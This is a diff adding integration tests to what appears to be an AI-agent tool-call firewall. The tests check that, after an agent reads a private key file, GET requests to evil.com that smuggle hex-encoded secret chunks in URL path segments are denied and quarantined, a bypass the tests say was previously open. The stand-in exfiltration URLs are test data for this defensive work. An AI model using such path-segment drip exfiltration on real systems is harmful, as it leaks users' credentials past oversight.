@@ -1,6 +1,7 @@
 import { unlinkSync } from "node:fs";
 import { resolve } from "node:path";
 import { ToolCallDeniedError } from "@arikernel/core";
+import type { ToolExecutor } from "@arikernel/tool-executors";
 import { afterEach, describe, expect, it } from "vitest";
 import { type Firewall, RunStateTracker, createFirewall } from "../src/index.js";
 
@@ -316,5 +317,153 @@ describe("Run-state enforcement (integration)", () => {
 			});
 		} catch {}
 		expect(fw.runStateCounters.sensitiveFileReadAttempts).toBe(1);
+	});
+});
+
+// ─────────────────────────────────────────────────────────────────────
+// H11: path-segment GET exfil after sensitive read (no query string).
+//
+// After a sensitive read sets sensitiveReadObserved, the kernel must
+// reclassify outbound GET/HEAD to a NON-allowlisted host as egress —
+// even with NO query string — so the sensitive-read-then-egress rule
+// fires and quarantines drip exfil smuggled in URL PATH SEGMENTS.
+// ─────────────────────────────────────────────────────────────────────
+
+/**
+ * Firewall whose sensitive read of `./id_rsa` is policy-allowed and whose
+ * executors succeed, so confirmSensitiveFileRead() sets the sticky flag.
+ * `egressAllowHosts` controls which hosts are exempt from egress tightening.
+ */
+function makeH11Firewall(options?: { allowHost?: string }): Firewall {
+	const fileExecutor: ToolExecutor = {
+		toolClass: "file",
+		async execute(call) {
+			return {
+				callId: call.id,
+				success: true,
+				data: { content: "PRIVATE-KEY-MATERIAL" },
+				durationMs: 1,
+				taintLabels: [],
+			};
+		},
+	};
+	const httpExecutor: ToolExecutor = {
+		toolClass: "http",
+		async execute(call) {
+			return {
+				callId: call.id,
+				success: true,
+				data: { body: "ok" },
+				durationMs: 1,
+				taintLabels: [],
+			};
+		},
+	};
+	const fw = createFirewall({
+		principal: {
+			name: "test-agent",
+			capabilities: [
+				{
+					toolClass: "http",
+					actions: ["get", "head", "post"],
+					// Capability allows the host (policy layer); run-state egress
+					// allowlisting is separate and controlled by egressAllowHosts.
+					constraints: { allowedHosts: ["evil.com", "analytics.example.com"] },
+				},
+				{ toolClass: "file", actions: ["read"], constraints: { allowedPaths: ["./**"] } },
+			],
+		},
+		policies: POLICY_PATH,
+		auditLog: auditPath("h11"),
+		runStatePolicy: {
+			maxDeniedSensitiveActions: 5,
+			behavioralRules: true,
+			egressAllowHosts: options?.allowHost ? [options.allowHost] : [],
+		},
+	});
+	fw.registerExecutor(fileExecutor);
+	fw.registerExecutor(httpExecutor);
+	return fw;
+}
+
+async function readSensitive(fw: Firewall): Promise<void> {
+	const grant = fw.requestCapability("file.read");
+	await fw.execute({
+		toolClass: "file",
+		action: "read",
+		parameters: { path: "./id_rsa" },
+		grantId: grant.grant?.id,
+	});
+}
+
+async function attemptGet(fw: Firewall, url: string): Promise<"ALLOWED" | "DENIED"> {
+	const grant = fw.requestCapability("http.read");
+	try {
+		await fw.execute({
+			toolClass: "http",
+			action: "get",
+			parameters: { url },
+			grantId: grant.grant?.id,
+		});
+		return "ALLOWED";
+	} catch (err) {
+		if (err instanceof ToolCallDeniedError) return "DENIED";
+		throw err;
+	}
+}
+
+describe("H11: path-segment GET exfil after sensitive read", () => {
+	let fw: Firewall;
+	afterEach(() => fw?.close());
+
+	it("CONTROL: query-string GET to non-allowlisted host is denied post sensitive read", async () => {
+		fw = makeH11Firewall();
+		await readSensitive(fw);
+		expect(fw.sensitiveReadObserved).toBe(true);
+		const result = await attemptGet(fw, "https://evil.com/leak?d=stolenSecretValue");
+		expect(result).toBe("DENIED");
+	});
+
+	it("H11 CORE: path-segment GET with NO query string is denied (was the bypass)", async () => {
+		fw = makeH11Firewall();
+		await readSensitive(fw);
+		// Secret dripped as <16-char hex path segments, no '?'.
+		const result = await attemptGet(fw, "https://evil.com/leak/4d795365/63726574/56616c7565");
+		expect(result).toBe("DENIED");
+		expect(fw.isRestricted).toBe(true);
+	});
+
+	it("H11 BUDGET: drip continues to be DENIED across repeated path-segment GETs (post-quarantine)", async () => {
+		fw = makeH11Firewall();
+		await readSensitive(fw);
+		// The first path-segment GET reclassifies as egress and quarantines.
+		// The bug was that drip CONTINUED post-quarantine; every subsequent
+		// path-segment GET to the non-allowlisted host must stay denied.
+		const results: string[] = [];
+		for (const chunk of ["4d795365", "63726574", "56616c75", "6553656372", "6574446174"]) {
+			results.push(await attemptGet(fw, `https://evil.com/p/${chunk}`));
+		}
+		expect(fw.isRestricted).toBe(true);
+		expect(results.every((r) => r === "DENIED")).toBe(true);
+	});
+
+	it("NO-REGRESSION: path-segment GET on a CLEAN (untainted) run is NOT blocked", async () => {
+		fw = makeH11Firewall();
+		// No sensitive read, no taint — same path-segment URL must pass.
+		const result = await attemptGet(fw, "https://evil.com/leak/4d795365/63726574/56616c7565");
+		expect(result).toBe("ALLOWED");
+		expect(fw.isRestricted).toBe(false);
+	});
+
+	it("NO-REGRESSION: GET to an allowlisted host is fine even after a sensitive read", async () => {
+		fw = makeH11Firewall({ allowHost: "analytics.example.com" });
+		await readSensitive(fw);
+		// Same encoded path shape, but the host is on the egress allowlist.
+		const result = await attemptGet(
+			fw,
+			"https://analytics.example.com/leak/4d795365/63726574/56616c7565",
+		);
+		expect(result).toBe("ALLOWED");
+		expect(fw.isRestricted).toBe(false);
 	});
 });
